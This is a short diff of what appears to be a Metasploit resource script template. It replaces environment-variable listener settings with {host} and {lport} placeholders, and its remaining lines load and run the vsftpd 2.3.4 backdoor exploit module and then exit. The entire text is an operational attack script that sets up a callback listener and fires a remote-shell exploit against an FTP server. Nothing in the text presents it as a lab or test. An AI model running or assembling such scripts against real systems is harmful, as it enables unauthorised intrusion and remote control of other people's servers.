@@ -1,5 +1,5 @@
-setg LHOST "$MSF_LHOST"
-setg LPORT "$MSF_LPORT"
+setg LHOST {host}
+setg LPORT {lport}
 use exploit/unix/ftp/vsftpd_234_backdoor
 exploit
 exit
